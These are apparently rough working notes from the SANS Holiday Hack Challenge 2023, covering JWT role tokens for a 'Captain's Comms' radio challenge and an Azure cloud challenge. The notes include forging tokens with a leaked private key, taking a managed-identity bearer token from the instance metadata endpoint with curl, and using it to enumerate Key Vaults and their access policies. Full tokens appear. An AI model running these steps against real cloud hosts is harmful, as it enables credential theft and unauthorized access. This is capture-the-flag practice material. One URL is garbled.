
radioMonitor User for console

JWT Radio Administrator

rMonitor.tok has radioMonitor role token
/jwtDefault 
can be used to view signals


private key in folder "no one will find"
keys folder in roleMonitor token, public key capsPubKey.key

implies the permissions on the key files are probably wrong?

radioDecoder token needed to decode

Just Watch This: Appendix A - Decoder



transmitter - special token for admins created during install


captain has a list of notes from chatntp about securing tokens
journal on pixel island


on load

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg
justWatchThisRole

{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioUser"
}


https://captainscomms.com/jwtDefault/keys/capsPubKey.key

invalid authorization token

capitanscookie
eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IkRlZmF1bHQgVXNlciJ9.ZX9qeA._sA3422es0bv0hzWGJCxKP3jpVw


{
  "captainsVictory": 0,
  "userid": "Default User"
}

payload
"e*jx"

"lincolnshire poacher" relevant, likely
https://www.numbers-stations.com/english/e03-the-lincolnshire-poacher


https://captainscomms.com/jwtDefault/rDecoder.tok
only specific (real?) urls get the invalid auth token. 



alabaster@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H "Metadata: true"
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjg2MzkzMCwibmJmIjoxNzAyODYzOTMwLCJleHAiOjE3MDI5NTA2MzAsImFpbyI6IkUyVmdZUENmMlpwNmRUYVhSK2EyU2VjVzNkd1ZCZ0E9IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6InBJUUtrczZad0V1S3ZSdi11MUdZQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.l40Fr1-_AXhQuLr0fYyjxKOE6PTq9_C4NxaA0Lsssox4hULqWoQlipbQvLPr2kFyJwr4Jvh2MrhQcM_4Z8sDtqOLsTVCjFWZUKXvdhaUdUUu5TKZj-qygTrapYNJi9Ynp7vJZUpw8TCYbQsF43p1b7kzlRSCjtyMggAwTTG1O7Ey-BgZAY2VOk6DWckcWzwfQ3U1gnevZAucQjpVjvmayDOwZWsI6pa-uV1gZSbFgwVKbMpeY2zmRXTVGWC9sm9EEGRB6i9OuNYDd7I56wxUZqReIr_q1DOuU-2K8lJz6iBxBwCH62-MfCLvdGiJGx6IaVCWRgOT-1G7ExIhtWu5GQ","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85093","expires_on":"1702950630","ext_expires_in":"86399","not_before":"1702863930","resource":"https://management.azure.com","token_type":"Bearer"}

GET https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?

https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.KeyVault/deletedVaults?api-version=2022-07-01$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2015-11-01

subscriptionId: 2b0942f3-9bca-484b-a508-abdae2db5e64


tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d

GET https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/deletedVaults?api-version=2022-07-01

alabaster@ssh-server-vm:~$ token="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjg2MzkzMCwibmJmIjoxNzAyODYzOTMwLCJleHAiOjE3MDI5NTA2MzAsImFpbyI6IkUyVmdZUENmMlpwNmRUYVhSK2EyU2VjVzNkd1ZCZ0E9IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6InBJUUtrczZad0V1S3ZSdi11MUdZQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.l40Fr1-_AXhQuLr0fYyjxKOE6PTq9_C4NxaA0Lsssox4hULqWoQlipbQvLPr2kFyJwr4Jvh2MrhQcM_4Z8sDtqOLsTVCjFWZUKXvdhaUdUUu5TKZj-qygTrapYNJi9Ynp7vJZUpw8TCYbQsF43p1b7kzlRSCjtyMggAwTTG1O7Ey-BgZAY2VOk6DWckcWzwfQ3U1gnevZAucQjpVjvmayDOwZWsI6pa-uV1gZSbFgwVKbMpeY2zmRXTVGWC9sm9EEGRB6i9OuNYDd7I56wxUZqReIr_q1DOuU-2K8lJz6iBxBwCH62-MfCLvdGiJGx6IaVCWRgOT-1G7ExIhtWu5GQ"
alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $token" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/deletedVaults?api-version=2022-07-01


curl --header "Authorization: Bearer $token"  https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2022-07-01

{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv","name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{},"systemData":{"createdBy":"thomas@sanshhc.onmicrosoft.com","createdByType":"User","createdAt":"2023-10-30T13:17:02.532Z","lastModifiedBy":"thomas@sanshhc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2023-10-30T13:17:02.532Z"},"properties":{"sku":{"family":"A","name":"Standard"},"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","accessPolicies":[],"enabledForDeployment":false,"enabledForDiskEncryption":false,"enabledForTemplateDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"enableRbacAuthorization":true,"vaultUri":"https://northpole-it-kv.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}}

alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $token"  https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdt/vaults/northpole-ssh-certs-kv?api-version=2022-07-01s/Microsoft.KeyVault
{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv","name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{},"systemData":{"createdBy":"thomas@sanshhc.onmicrosoft.com","createdByType":"User","createdAt":"2023-11-12T01:47:13.059Z","lastModifiedBy":"thomas@sanshhc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2023-11-12T01:50:52.742Z"},"properties":{"sku":{"family":"A","name":"standard"},"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","accessPolicies":[{"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","objectId":"0bc7ae9d-292d-4742-8830-68d12469d759","permissions":{"keys":["all"],"secrets":["all"],"certificates":["all"],"storage":["all"]}},{"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","objectId":"1b202351-8c85-46f1-81f8-5528e92eb7ce","permissions":{"secrets":["get"]}}],"enabledForDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"vaultUri":"https://northpole-ssh-certs-kv.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}}


curl --header "Authorization: Bearer $token" https://northpole-ssh-certs-kv.vault.azure.net//keys?api-version=7.4

there are three software defined roles and an special admin role
radioUser
radioDecoder
radioMonitor
admin - GeeseIslandsSuperChiefCommunicationsOfficer?


I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.

burp 

pixel island--more journals?
private key will be able to update jwts